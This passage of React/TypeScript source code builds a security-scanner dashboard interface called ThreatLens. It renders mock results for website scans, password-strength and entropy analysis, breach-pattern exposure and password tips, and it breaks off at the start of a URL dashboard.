                      <span className="text-sm font-semibold" style={{ color: "#cbd5e1", fontFamily: "'Plus Jakarta Sans', sans-serif" }}>{f.title}</span>
                      <span className="tl-pill text-xs" style={{ background: `${cfg.color}12`, color: cfg.color, border: `1px solid ${cfg.color}28` }}>{cfg.label}</span>
                    </div>
                    <p className="text-xs leading-relaxed" style={{ color: "#64748b" }}>{f.desc}</p>
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      </div>
    </div>
  );
}

/* ─── SECTION: LEARNING ──────────────────────────────────────────────────── */
function LearningSection({ expanded, setExpanded }: { expanded: number | null; setExpanded: (n: number | null) => void }) {
  const sevColor: Record<string, string> = { high: "#ef4444", medium: "#f59e0b", low: "#10b981" };

  return (
    <div className="space-y-4 tl-fade-enter">
      <SectionHeader icon={BookOpen} label="Security Learning Center" />
      <p className="text-sm" style={{ color: "#64748b" }}>Deep-dive explanations for the vulnerabilities and misconfigurations detected on this target.</p>
      <div className="space-y-3">
        {D.learning.map((item, i) => {
          const open = expanded === i;
          const color = sevColor[item.severity] ?? "#64748b";
          return (
            <div key={i} className="tl-glass overflow-hidden">
              <button
                className="w-full flex items-center justify-between p-5 text-left"
                onClick={() => setExpanded(open ? null : i)}
                style={{ transition: "background 0.15s ease" }}
              >
                <div className="flex items-center gap-3">
                  <div className="w-2 h-2 rounded-full flex-shrink-0" style={{ background: color }} />
                  <span className="text-sm font-semibold" style={{ color: "#cbd5e1", fontFamily: "'Plus Jakarta Sans', sans-serif" }}>{item.title}</span>
                  <span className="tl-pill text-xs" style={{ background: `${color}12`, color, border: `1px solid ${color}28` }}>{item.severity}</span>
                </div>
                <div style={{ transform: open ? "rotate(180deg)" : "rotate(0deg)", transition: "transform 0.25s ease", color: "#475569" }}>
                  <ChevronDown size={16} />
                </div>
              </button>

              {open && (
                <div className="px-5 pb-5" style={{ animation: "tl-slide-up 0.3s ease forwards", borderTop: "1px solid rgba(6,182,212,0.08)" }}>
                  <div className="grid gap-4 pt-4" style={{ gridTemplateColumns: "1fr 1fr" }}>
                    {[
                      { label: "What is it?",       text: item.what       },
                      { label: "Why does it happen?",text: item.why        },
                      { label: "Real-world example", text: item.example    },
                      { label: "Prevention",         text: item.prevention },
                    ].map(({ label, text }) => (
                      <div key={label}>
                        <div className="text-xs font-bold mb-1.5" style={{ color: "#334155", letterSpacing: "1px", fontFamily: "'JetBrains Mono', monospace" }}>{label.toUpperCase()}</div>
                        <p className="text-xs leading-relaxed" style={{ color: "#64748b" }}>{text}</p>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>
          );
        })}
      </div>
    </div>
  );
}

/* ─── SECTION HEADER ─────────────────────────────────────────────────────── */
function SectionHeader({ icon: Icon, label, badge }: { icon: React.ElementType; label: string; badge?: { text: string; color: string } }) {
  return (
    <div className="flex items-center gap-3 mb-1">
      <div className="p-2 rounded-xl" style={{ background: "rgba(6,182,212,0.1)", border: "1px solid rgba(6,182,212,0.15)" }}>
        <Icon size={18} style={{ color: "#06b6d4" }} />
      </div>
      <h2 className="font-bold text-lg" style={{ color: "#e2e8f0", fontFamily: "'Plus Jakarta Sans', sans-serif", letterSpacing: "-0.2px" }}>{label}</h2>
      {badge && (
        <span className="tl-pill text-xs" style={{ background: `${badge.color}12`, color: badge.color, border: `1px solid ${badge.color}28` }}>{badge.text}</span>
      )}
    </div>
  );
}

/* ─── RESULTS DASHBOARD ──────────────────────────────────────────────────── */
function ResultsDashboard({ target, onReset }: { target: string; onReset: () => void }) {
  const [section, setSection]           = useState<Section>("overview");
  const [sidebarOpen, setSidebarOpen]   = useState(true);
  const [score, setScore]               = useState(0);
  const [cardCount, setCardCount]       = useState(0);
  const [expandedLesson, setLesson]     = useState<number | null>(null);

  useEffect(() => {
    let cur = 0;
    const interval = setInterval(() => {
      cur += 1.8;
      if (cur >= D.score) { cur = D.score; clearInterval(interval); }
      setScore(Math.floor(cur));
    }, 18);
    for (let i = 0; i <= D.modules.length; i++) {
      setTimeout(() => setCardCount(i + 1), 180 + i * 90);
    }
    return () => clearInterval(interval);
  }, []);

  const handleSectionChange = (s: Section) => {
    setSection(s);
    if (s === "overview") {
      setCardCount(0);
      for (let i = 0; i <= D.modules.length; i++) {
        setTimeout(() => setCardCount(i + 1), 40 + i * 70);
      }
    }
  };

  const scoreColor = score >= 85 ? "#10b981" : score >= 65 ? "#06b6d4" : score >= 45 ? "#f59e0b" : "#ef4444";

  return (
    <div className="flex h-screen overflow-hidden" style={{ background: "#030712", fontFamily: "'Plus Jakarta Sans', sans-serif" }}>
      {/* Sidebar */}
      <aside style={{
        width: sidebarOpen ? "220px" : "60px",
        transition: "width 0.25s cubic-bezier(0.4,0,0.2,1)",
        flexShrink: 0,
        display: "flex",
        flexDirection: "column",
        background: "rgba(6, 12, 26, 0.75)",
        backdropFilter: "blur(20px)",
        WebkitBackdropFilter: "blur(20px)",
        borderRight: "1px solid rgba(6,182,212,0.09)",
        overflow: "hidden",
      }}>
        {/* Sidebar header */}
        <div className="flex items-center gap-3 px-4 py-4" style={{ borderBottom: "1px solid rgba(6,182,212,0.07)", minHeight: "64px" }}>
          <div className="flex-shrink-0">
            <Shield size={19} style={{ color: "#06b6d4" }} />
          </div>
          {sidebarOpen && (
            <div className="flex-1 min-w-0">
              <div className="font-bold text-sm truncate" style={{ color: "#e2e8f0" }}>ThreatLens</div>
              <div className="text-xs" style={{ color: "#1e3a5f", fontFamily: "'JetBrains Mono', monospace" }}>v2.1.0</div>
            </div>
          )}
          <button onClick={() => setSidebarOpen(!sidebarOpen)} className="flex-shrink-0 p-1 rounded-lg transition-colors hover:bg-white/5" style={{ color: "#475569" }}>
            <Menu size={15} />
          </button>
        </div>

        {/* Nav */}
        <nav className="flex-1 py-3 overflow-y-auto">
          {NAV.map(({ id, label, Icon }) => {
            const Icon2 = Icon;
            return (
              <button key={id} onClick={() => handleSectionChange(id)}
                className={`tl-nav-item w-full flex items-center gap-3 px-4 py-2.5 text-left ${section === id ? "tl-nav-active" : ""}`}
                style={{ color: section === id ? "#06b6d4" : "#64748b", fontSize: "13px", background: "none", border: "none", cursor: "pointer", fontFamily: "'Inter', sans-serif", fontWeight: 500 }}
              >
                <Icon2 size={15} style={{ flexShrink: 0 }} />
                {sidebarOpen && <span className="truncate">{label}</span>}
              </button>
            );
          })}
        </nav>

        {/* Sidebar footer */}
        <div className="px-3 py-3" style={{ borderTop: "1px solid rgba(6,182,212,0.07)" }}>
          <button onClick={onReset} className="tl-nav-item w-full flex items-center gap-3 py-2 px-1 rounded-lg" style={{ color: "#334155", fontSize: "12px", background: "none", border: "none", cursor: "pointer", fontFamily: "'Inter', sans-serif" }}>
            <RefreshCw size={14} style={{ flexShrink: 0 }} />
            {sidebarOpen && <span>New Analysis</span>}
          </button>
        </div>
      </aside>

      {/* Main */}
      <main className="flex-1 flex flex-col overflow-hidden">
        {/* Top bar */}
        <header className="flex items-center justify-between px-6 py-4 flex-shrink-0" style={{ borderBottom: "1px solid rgba(6,182,212,0.07)", background: "rgba(6,12,26,0.55)", backdropFilter: "blur(12px)" }}>
          <div>
            <div className="flex items-center gap-2 flex-wrap">
              <span className="text-xs" style={{ color: "#1e3a5f", fontFamily: "'JetBrains Mono', monospace" }}>Target</span>
              <span className="text-sm font-semibold" style={{ color: "#06b6d4", fontFamily: "'JetBrains Mono', monospace" }}>{target}</span>
              <span className="tl-pill text-xs" style={{ background: "#10b98112", color: "#10b981", border: "1px solid #10b98128" }}>{D.grade} · {D.risk}</span>
            </div>
            <div className="text-xs mt-0.5" style={{ color: "#1e3a5f", fontFamily: "'JetBrains Mono', monospace" }}>
              {new Date().toLocaleDateString("en-US", { month: "short", day: "numeric", year: "numeric" })} · {D.confidence}
            </div>
          </div>
          <div className="flex items-center gap-4">
            <div className="text-right">
              <div className="font-extrabold text-2xl" style={{ color: scoreColor, lineHeight: 1, fontFamily: "'Plus Jakarta Sans', sans-serif" }}>{score}</div>
              <div className="text-xs" style={{ color: "#1e3a5f", fontFamily: "'JetBrains Mono', monospace" }}>Risk Score</div>
            </div>
            <div className="w-px h-8" style={{ background: "rgba(6,182,212,0.1)" }} />
            <button onClick={onReset} className="flex items-center gap-1.5 text-xs px-3 py-2 rounded-lg transition-all duration-150 hover:bg-white/5" style={{ color: "#475569", border: "1px solid rgba(255,255,255,0.06)", cursor: "pointer", background: "none", fontFamily: "'Inter', sans-serif" }}>
              <RefreshCw size={12} />
              New Scan
            </button>
          </div>
        </header>

        {/* Content */}
        <div className="flex-1 overflow-y-auto px-6 py-6">
          {section === "overview"  && <OverviewSection  score={score} cardCount={cardCount} setSection={handleSectionChange} />}
          {section === "ssl"       && <SSLSection />}
          {section === "dns"       && <DNSSection />}
          {section === "headers"   && <HeadersSection />}
          {section === "cookies"   && <CookiesSection />}
          {section === "tech"      && <TechSection />}
          {section === "findings"  && <FindingsSection />}
          {section === "learning"  && <LearningSection expanded={expandedLesson} setExpanded={setLesson} />}
        </div>
      </main>
    </div>
  );
}

/* ─── SHARED DASHBOARD SIDEBAR ───────────────────────────────────────────── */
function DashboardSidebar({ nav, section, setSection, open, setOpen, onReset, score, scoreColor }: {
  nav: { id: string; label: string; Icon: React.ElementType }[];
  section: string;
  setSection: (s: string) => void;
  open: boolean;
  setOpen: (v: boolean) => void;
  onReset: () => void;
  score: number;
  scoreColor: string;
}) {
  return (
    <aside style={{ width: open ? "220px" : "60px", transition: "width 0.25s cubic-bezier(0.4,0,0.2,1)", flexShrink: 0, display: "flex", flexDirection: "column", background: "rgba(6,12,26,0.75)", backdropFilter: "blur(20px)", WebkitBackdropFilter: "blur(20px)", borderRight: "1px solid rgba(6,182,212,0.09)", overflow: "hidden" }}>
      <div className="flex items-center gap-3 px-4 py-4" style={{ borderBottom: "1px solid rgba(6,182,212,0.07)", minHeight: "64px" }}>
        <div className="flex-shrink-0"><Shield size={19} style={{ color: "#06b6d4" }} /></div>
        {open && <div className="flex-1 min-w-0"><div className="font-bold text-sm truncate" style={{ color: "#e2e8f0" }}>ThreatLens</div><div className="text-xs" style={{ color: "#1e3a5f", fontFamily: "'JetBrains Mono', monospace" }}>v2.1.0</div></div>}
        <button onClick={() => setOpen(!open)} style={{ flexShrink: 0, padding: "4px", borderRadius: "8px", color: "#475569", background: "none", border: "none", cursor: "pointer" }}>
          <Menu size={15} />
        </button>
      </div>
      <nav className="flex-1 py-3 overflow-y-auto">
        {nav.map(({ id, label, Icon }) => {
          const Ic = Icon;
          return (
            <button key={id} onClick={() => setSection(id)} className={`tl-nav-item w-full flex items-center gap-3 px-4 py-2.5 text-left ${section === id ? "tl-nav-active" : ""}`} style={{ color: section === id ? "#06b6d4" : "#64748b", fontSize: "13px", background: "none", border: "none", cursor: "pointer", fontFamily: "'Inter', sans-serif", fontWeight: 500 }}>
              <Ic size={15} style={{ flexShrink: 0 }} />
              {open && <span className="truncate">{label}</span>}
            </button>
          );
        })}
      </nav>
      <div className="px-3 py-3" style={{ borderTop: "1px solid rgba(6,182,212,0.07)" }}>
        <button onClick={onReset} className="tl-nav-item w-full flex items-center gap-3 py-2 px-1 rounded-lg" style={{ color: "#334155", fontSize: "12px", background: "none", border: "none", cursor: "pointer", fontFamily: "'Inter', sans-serif" }}>
          <RefreshCw size={14} style={{ flexShrink: 0 }} />
          {open && <span>New Analysis</span>}
        </button>
      </div>
    </aside>
  );
}

/* ─── PASSWORD DASHBOARD ─────────────────────────────────────────────────── */
function PasswordDashboard({ target, onReset }: { target: string; onReset: () => void }) {
  const [section, setSection]   = useState<PasswordSection>("overview");
  const [open,    setOpen]      = useState(true);
  const [score,   setScore]     = useState(0);
  const [cardCount, setCC]      = useState(0);

  useEffect(() => {
    let cur = 0;
    const iv = setInterval(() => { cur += 1.5; if (cur >= PD.score) { cur = PD.score; clearInterval(iv); } setScore(Math.floor(cur)); }, 18);
    for (let i = 0; i <= PD.modules.length; i++) setTimeout(() => setCC(i + 1), 180 + i * 90);
    return () => clearInterval(iv);
  }, []);

  const handleSection = (s: string) => {
    setSection(s as PasswordSection);
    if (s === "overview") { setCC(0); for (let i = 0; i <= PD.modules.length; i++) setTimeout(() => setCC(i + 1), 40 + i * 70); }
  };

  const sc = score >= 85 ? "#10b981" : score >= 65 ? "#06b6d4" : score >= 45 ? "#f59e0b" : "#ef4444";

  return (
    <div className="flex h-screen overflow-hidden" style={{ background: "#030712", fontFamily: "'Plus Jakarta Sans', sans-serif" }}>
      <DashboardSidebar nav={PASSWORD_NAV} section={section} setSection={handleSection} open={open} setOpen={setOpen} onReset={onReset} score={score} scoreColor={sc} />
      <main className="flex-1 flex flex-col overflow-hidden">
        {/* Header */}
        <header className="flex items-center justify-between px-6 py-4 flex-shrink-0" style={{ borderBottom: "1px solid rgba(6,182,212,0.07)", background: "rgba(6,12,26,0.55)", backdropFilter: "blur(12px)" }}>
          <div>
            <div className="flex items-center gap-2">
              <span className="text-xs" style={{ color: "#1e3a5f", fontFamily: "'JetBrains Mono', monospace" }}>Password</span>
              <span className="text-sm font-semibold" style={{ color: "#06b6d4", fontFamily: "'JetBrains Mono', monospace" }}>{"•".repeat(Math.min(target.length, 20))}</span>
              <span className="tl-pill text-xs" style={{ background: `${sc}12`, color: sc, border: `1px solid ${sc}28` }}>{PD.grade} · {PD.strength}</span>
            </div>
            <div className="text-xs mt-0.5" style={{ color: "#1e3a5f", fontFamily: "'JetBrains Mono', monospace" }}>{new Date().toLocaleDateString("en-US", { month: "short", day: "numeric", year: "numeric" })} · Password Security Analyzer</div>
          </div>
          <div className="flex items-center gap-4">
            <div className="text-right"><div className="font-extrabold text-2xl" style={{ color: sc, lineHeight: 1, fontFamily: "'Plus Jakarta Sans', sans-serif" }}>{score}</div><div className="text-xs" style={{ color: "#1e3a5f", fontFamily: "'JetBrains Mono', monospace" }}>Strength Score</div></div>
            <div className="w-px h-8" style={{ background: "rgba(6,182,212,0.1)" }} />
            <button onClick={onReset} className="flex items-center gap-1.5 text-xs px-3 py-2 rounded-lg hover:bg-white/5" style={{ color: "#475569", border: "1px solid rgba(255,255,255,0.06)", cursor: "pointer", background: "none", fontFamily: "'Inter', sans-serif" }}><RefreshCw size={12} />New Scan</button>
          </div>
        </header>
        {/* Content */}
        <div className="flex-1 overflow-y-auto px-6 py-6">
          {section === "overview" && <PwOverviewSection score={score} cardCount={cardCount} setSection={handleSection} />}
          {section === "strength" && <PwStrengthSection />}
          {section === "entropy"  && <PwEntropySection />}
          {section === "patterns" && <PwPatternsSection />}
          {section === "exposure" && <PwExposureSection />}
          {section === "tips"     && <PwTipsSection />}
        </div>
      </main>
    </div>
  );
}

/* ─── PASSWORD SECTIONS ──────────────────────────────────────────────────── */
function PwOverviewSection({ score, cardCount, setSection }: { score: number; cardCount: number; setSection: (s: string) => void }) {
  const sc = score >= 85 ? "#10b981" : score >= 65 ? "#06b6d4" : score >= 45 ? "#f59e0b" : "#ef4444";
  return (
    <div className="space-y-5 tl-fade-enter">
      <div className="grid gap-4" style={{ gridTemplateColumns: "auto 1fr" }}>
        <div className="tl-glass p-6 flex flex-col items-center justify-center" style={{ minWidth: "210px" }}>
          <ScoreRing display={score} final={PD.score} />
          <div className="mt-4 text-center">
            <div className="font-extrabold text-2xl" style={{ color: sc, letterSpacing: "-0.5px", fontFamily: "'Plus Jakarta Sans', sans-serif" }}>{PD.grade}</div>
            <div className="text-sm font-medium mt-0.5" style={{ color: "#94a3b8" }}>{PD.strength}</div>
            <div className="text-xs mt-0.5" style={{ color: "#334155", fontFamily: "'JetBrains Mono', monospace" }}>Entropy: {PD.entropy} bits</div>
          </div>
        </div>
        <div className="grid gap-4" style={{ gridTemplateColumns: "1fr 1fr" }}>
          <div className="tl-glass p-5">
            <div className="text-xs font-bold mb-4" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>ANALYSIS SUMMARY</div>
            <div className="space-y-3">
              {[
                { label: "Entropy",       value: `${PD.entropy} bits`,  color: "#f59e0b" },
                { label: "Crack Time",    value: PD.crackTime,          color: "#f59e0b" },
                { label: "Char Types",    value: `${PD.charTypes} / 4`, color: "#06b6d4" },
                { label: "Strength",      value: PD.strength,           color: sc },
                { label: "Score",         value: `${score} / 100`,      color: sc },
              ].map(({ label, value, color }) => (
                <div key={label} className="flex items-center justify-between">
                  <span className="text-xs" style={{ color: "#475569" }}>{label}</span>
                  <span className="font-bold text-sm" style={{ color, fontFamily: "'JetBrains Mono', monospace" }}>{value}</span>
                </div>
              ))}
            </div>
          </div>
          <div className="tl-glass p-5">
            <div className="text-xs font-bold mb-1" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>RISK DISTRIBUTION</div>
            <ResponsiveContainer width="100%" height={130}>
              <PieChart>
                <Pie data={PD.donut} cx="50%" cy="50%" innerRadius={38} outerRadius={56} paddingAngle={3} dataKey="value" animationBegin={400} animationDuration={1200}>
                  {PD.donut.map((entry, i) => <Cell key={i} fill={entry.color} />)}
                </Pie>
                <Tooltip contentStyle={{ background: "#080f1e", border: "1px solid rgba(6,182,212,0.18)", borderRadius: "8px", fontSize: "12px", fontFamily: "'JetBrains Mono', monospace" }} />
              </PieChart>
            </ResponsiveContainer>
            <div className="flex justify-center gap-3">
              {PD.donut.map(d => <div key={d.name} className="flex items-center gap-1.5"><div className="w-2 h-2 rounded-full" style={{ background: d.color }} /><span className="text-xs" style={{ color: "#475569" }}>{d.name}</span></div>)}
            </div>
          </div>
        </div>
      </div>
      <div className="tl-glass p-5">
        <div className="text-xs font-bold mb-2" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>SECURITY DIMENSIONS</div>
        <ResponsiveContainer width="100%" height={250}>
          <RadarChart data={PD.radar} outerRadius={88}>
            <PolarGrid stroke="rgba(6,182,212,0.07)" />
            <PolarAngleAxis dataKey="subject" tick={{ fill: "#475569", fontSize: 11, fontFamily: "'JetBrains Mono', monospace" }} />
            <Radar dataKey="value" stroke="#f59e0b" fill="#f59e0b" fillOpacity={0.1} strokeWidth={2} animationBegin={600} animationDuration={1400} dot={{ r: 3, fill: "#f59e0b", strokeWidth: 0 }} />
          </RadarChart>
        </ResponsiveContainer>
      </div>
      <div>
        <div className="text-xs font-bold mb-3" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>ANALYSIS MODULES</div>
        <div className="grid gap-3" style={{ gridTemplateColumns: "repeat(auto-fill, minmax(210px, 1fr))" }}>
          {PD.modules.map((mod, i) => {
            const visible = i < cardCount;
            const c = { pass: "#10b981", warn: "#f59e0b", fail: "#ef4444", info: "#3b82f6" }[mod.status];
            return (
              <div key={i} onClick={() => setSection(i < 5 ? ["overview","strength","entropy","patterns","exposure","tips"][Math.min(i,5)] : "tips")}
                className="tl-glass p-4 cursor-pointer"
                style={{ opacity: visible ? 1 : 0, transform: visible ? "translateY(0)" : "translateY(18px)", transition: `opacity 0.4s ease ${i * 0.055}s, transform 0.4s ease ${i * 0.055}s` }}>
                <div className="flex items-start justify-between mb-3">
                  <div className="p-1.5 rounded-lg" style={{ background: `${c}12` }}><Key size={15} style={{ color: c }} /></div>
                  <StatusBadge status={mod.status} />
                </div>
                <div className="text-sm font-semibold mb-0.5" style={{ color: "#cbd5e1", fontFamily: "'Plus Jakarta Sans', sans-serif" }}>{mod.label}</div>
                <div className="text-xs mb-3" style={{ color: "#475569", fontFamily: "'JetBrains Mono', monospace" }}>{mod.metric}</div>
                <div style={{ background: "rgba(255,255,255,0.04)", borderRadius: "999px", height: "3px", overflow: "hidden" }}>
                  <div style={{ background: `linear-gradient(90deg, ${c}, ${c}88)`, width: visible ? `${mod.score}%` : "0%", height: "100%", borderRadius: "999px", transition: `width 0.9s ease ${i * 0.055 + 0.3}s` }} />
                </div>
                <div className="flex justify-between mt-1.5"><span className="text-xs" style={{ color: "#1e3a5f" }}>Score</span><span className="text-xs" style={{ color: c, fontFamily: "'JetBrains Mono', monospace" }}>{mod.score}</span></div>
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );
}

function PwStrengthSection() {
  return (
    <div className="space-y-4 tl-fade-enter">
      <SectionHeader icon={Zap} label="Password Strength Analysis" badge={{ text: `${PD.strength} · ${PD.grade}`, color: "#f59e0b" }} />
      <div className="grid gap-4" style={{ gridTemplateColumns: "1fr 1fr" }}>
        <div className="tl-glass p-5">
          <div className="text-xs font-bold mb-4" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>STRENGTH CRITERIA</div>
          <div className="space-y-0">
            {PD.criteria.map((c, i) => (
              <div key={i} className="tl-table-row flex items-center gap-3 py-3 border-b" style={{ borderColor: "rgba(6,182,212,0.06)" }}>
                {c.met ? <CheckCircle size={14} style={{ color: "#10b981", flexShrink: 0 }} /> : <XCircle size={14} style={{ color: "#ef4444", flexShrink: 0 }} />}
                <span className="text-xs" style={{ color: c.met ? "#94a3b8" : "#64748b" }}>{c.label}</span>
              </div>
            ))}
          </div>
        </div>
        <div className="space-y-4">
          {[
            { label: "Entropy",         value: `${PD.entropy} bits`, pct: 55, color: "#f59e0b", note: "Target: 60+ bits for strong passwords" },
            { label: "Crack Time",      value: PD.crackTime,         pct: 30, color: "#ef4444", note: "GPU-based hashcat attack estimate" },
            { label: "Character Pool",  value: "~72 chars",          pct: 65, color: "#06b6d4", note: "A–Z, a–z, 0–9 detected" },
          ].map(({ label, value, pct, color, note }) => (
            <div key={label} className="tl-glass p-4">
              <div className="flex justify-between mb-2">
                <span className="text-xs" style={{ color: "#64748b" }}>{label}</span>
                <span className="text-xs font-bold" style={{ color, fontFamily: "'JetBrains Mono', monospace" }}>{value}</span>
              </div>
              <div style={{ background: "rgba(255,255,255,0.04)", borderRadius: "999px", height: "5px", overflow: "hidden" }}>
                <div style={{ background: `linear-gradient(90deg, ${color}, ${color}88)`, width: `${pct}%`, height: "100%", borderRadius: "999px", transition: "width 0.8s ease" }} />
              </div>
              <div className="text-xs mt-2" style={{ color: "#334155", fontFamily: "'JetBrains Mono', monospace" }}>{note}</div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

function PwEntropySection() {
  return (
    <div className="space-y-4 tl-fade-enter">
      <SectionHeader icon={Activity} label="Entropy Analysis" badge={{ text: `${PD.entropy} bits`, color: "#f59e0b" }} />
      <div className="tl-glass p-6">
        <div className="text-center mb-6">
          <div className="font-extrabold" style={{ fontSize: "64px", color: "#f59e0b", fontFamily: "'JetBrains Mono', monospace", lineHeight: 1 }}>{PD.entropy}</div>
          <div className="text-sm mt-2" style={{ color: "#64748b" }}>bits of entropy</div>
        </div>
        <div className="grid gap-4" style={{ gridTemplateColumns: "repeat(3, 1fr)" }}>
          {[
            { label: "Weak",        range: "< 28 bits",   color: "#ef4444", current: false },
            { label: "Fair",        range: "28–35 bits",  color: "#f59e0b", current: false },
            { label: "Moderate",    range: "36–59 bits",  color: "#06b6d4", current: true  },
            { label: "Strong",      range: "60–127 bits", color: "#10b981", current: false },
            { label: "Very Strong", range: "128+ bits",   color: "#10b981", current: false },
          ].slice(0, 3).map(({ label, range, color, current }) => (
            <div key={label} className="text-center p-3 rounded-xl" style={{ background: current ? `${color}15` : "rgba(255,255,255,0.02)", border: current ? `1px solid ${color}30` : "1px solid rgba(255,255,255,0.04)" }}>
              <div className="text-xs font-bold mb-0.5" style={{ color: current ? color : "#334155" }}>{label}</div>
              <div className="text-xs" style={{ color: "#334155", fontFamily: "'JetBrains Mono', monospace" }}>{range}</div>
              {current && <div className="text-xs mt-1" style={{ color }}> ← You are here</div>}
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

function PwPatternsSection() {
  const patterns = [
    { type: "Sequential Characters", detected: true,  examples: ["12", "ab"], risk: "high"   },
    { type: "Dictionary Words",       detected: true,  examples: ["common word pattern"], risk: "high" },
    { type: "Keyboard Walks",         detected: false, examples: [], risk: "low"   },
    { type: "Repeated Characters",    detected: false, examples: [], risk: "low"   },
    { type: "Common Substitutions",   detected: true,  examples: ["@ for a", "0 for o"], risk: "medium" },
    { type: "Date Patterns",          detected: false, examples: [], risk: "low"   },
  ];
  return (
    <div className="space-y-4 tl-fade-enter">
      <SectionHeader icon={Eye} label="Pattern Detection" badge={{ text: "3 Patterns Found", color: "#f59e0b" }} />
      <div className="tl-glass p-5">
        <div className="space-y-0">
          {patterns.map((p, i) => (
            <div key={i} className="tl-table-row flex items-center gap-4 py-3 border-b" style={{ borderColor: "rgba(6,182,212,0.06)" }}>
              {p.detected ? <AlertTriangle size={14} style={{ color: p.risk === "high" ? "#ef4444" : "#f59e0b", flexShrink: 0 }} /> : <CheckCircle size={14} style={{ color: "#10b981", flexShrink: 0 }} />}
              <div className="flex-1">
                <div className="text-xs font-semibold" style={{ color: "#94a3b8" }}>{p.type}</div>
                {p.examples.length > 0 && <div className="text-xs" style={{ color: "#475569", fontFamily: "'JetBrains Mono', monospace" }}>{p.examples.join(", ")}</div>}
              </div>
              <span className="tl-pill text-xs" style={{ background: p.detected ? `${p.risk === "high" ? "#ef4444" : "#f59e0b"}12` : "#10b98112", color: p.detected ? (p.risk === "high" ? "#ef4444" : "#f59e0b") : "#10b981", border: `1px solid ${p.detected ? (p.risk === "high" ? "#ef4444" : "#f59e0b") : "#10b981"}28` }}>
                {p.detected ? "Detected" : "Clean"}
              </span>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

function PwExposureSection() {
  return (
    <div className="space-y-4 tl-fade-enter">
      <SectionHeader icon={AlertTriangle} label="Breach Database Exposure" badge={{ text: "Pattern Match", color: "#ef4444" }} />
      <div className="tl-glass p-6">
        <div className="flex items-center gap-4 mb-6">
          <div className="w-16 h-16 rounded-2xl flex items-center justify-center flex-shrink-0" style={{ background: "rgba(239,68,68,0.1)", border: "1px solid rgba(239,68,68,0.25)" }}>
            <AlertTriangle size={28} style={{ color: "#ef4444" }} />
          </div>
          <div>
            <div className="font-bold text-lg" style={{ color: "#ef4444", fontFamily: "'Plus Jakarta Sans', sans-serif" }}>Pattern Match Detected</div>
            <div className="text-sm mt-1" style={{ color: "#64748b" }}>This password's structure matches patterns from known data breaches.</div>
          </div>
        </div>
        {[
          { db: "RockYou (2009)",        matches: "Pattern match",  records: "14.3M"   },
          { db: "Collection #1 (2019)",  matches: "Variant match",  records: "773M"    },
          { db: "COMB (2021)",           matches: "Structural",     records: "3.28B"   },
        ].map((b, i) => (
          <div key={i} className="tl-table-row flex items-center justify-between py-3 border-b" style={{ borderColor: "rgba(6,182,212,0.06)" }}>
            <div><div className="text-xs font-semibold" style={{ color: "#94a3b8" }}>{b.db}</div><div className="text-xs" style={{ color: "#475569", fontFamily: "'JetBrains Mono', monospace" }}>{b.records} credentials</div></div>
            <span className="tl-pill text-xs" style={{ background: "#ef444412", color: "#ef4444", border: "1px solid #ef444428" }}>{b.matches}</span>
          </div>
        ))}
      </div>
    </div>
  );
}

function PwTipsSection() {
  const tips = [
    { title: "Use a Passphrase",          desc: "Combine 4–5 random words: 'correct-horse-battery-staple'. Long passphrases are both memorable and extremely secure.",                      impact: "Very High" },
    { title: "Add Special Characters",    desc: "Include at least 2 special characters (!, @, #, $). Place them in non-obvious positions — not just at the end.",                         impact: "High"      },
    { title: "Reach 16+ Characters",      desc: "Length is the single most impactful factor. Each extra character multiplies crack time exponentially.",                                   impact: "Very High" },
    { title: "Use a Password Manager",    desc: "Generate and store unique 20+ character random passwords for every account. Never reuse passwords across sites.",                        impact: "Critical"  },
    { title: "Enable 2FA Everywhere",     desc: "Even a weak password becomes far harder to exploit with TOTP or hardware key second factor authentication.",                              impact: "Critical"  },
  ];
  const impactColor = { "Critical": "#ef4444", "Very High": "#f59e0b", "High": "#06b6d4" } as Record<string, string>;
  return (
    <div className="space-y-4 tl-fade-enter">
      <SectionHeader icon={BookOpen} label="Security Recommendations" />
      <div className="space-y-3">
        {tips.map((t, i) => (
          <div key={i} className="tl-glass p-5">
            <div className="flex items-center justify-between mb-2">
              <span className="text-sm font-semibold" style={{ color: "#e2e8f0", fontFamily: "'Plus Jakarta Sans', sans-serif" }}>{t.title}</span>
              <span className="tl-pill text-xs" style={{ background: `${impactColor[t.impact]}12`, color: impactColor[t.impact], border: `1px solid ${impactColor[t.impact]}28` }}>{t.impact}</span>
            </div>
            <p className="text-xs leading-relaxed" style={{ color: "#64748b" }}>{t.desc}</p>
          </div>
        ))}
      </div>
    </div>
  );
}

/* ─── URL DASHBOARD ──────────────────────────────────────────────────────── */
function URLDashboard({ target, onReset }: { target: string; onReset: () => void }) {
  const [section, setSection] = useState<URLSection>("overview");
  const [open,    setOpen]    = useState(true);
  const [score,   setScore]   = useState(0);
  const [cardCount, setCC]    = useState(0);

  useEffect(() => {
    let cur = 0;
    const iv = setInterval(() => { cur += 1.2; if (cur >= UD.threatScore) { cur = UD.threatScore; clearInterval(iv); } setScore(Math.floor(cur)); }, 18);
    for (let i = 0; i <= UD.modules.length; i++) setTimeout(() => setCC(i + 1), 180 + i * 80);
    return () => clearInterval(iv);
  }, []);

  const handleSection = (s: string) => {
    setSection(s as URLSection);
    if (s === "overview") { setCC(0); for (let i = 0; i <= UD.modules.length; i++) setTimeout(() => setCC(i + 1), 40 + i * 60); }
  };

  const threatColor = score >= 70 ? "#ef4444" : score >= 50 ? "#f59e0b" : "#06b6d4";

  return (
    <div className="flex h-screen overflow-hidden" style={{ background: "#030712", fontFamily: "'Plus Jakarta Sans', sans-serif" }}>
      <DashboardSidebar nav={URL_NAV} section={section} setSection={handleSection} open={open} setOpen={setOpen} onReset={onReset} score={score} scoreColor={threatColor} />
      <main className="flex-1 flex flex-col overflow-hidden">
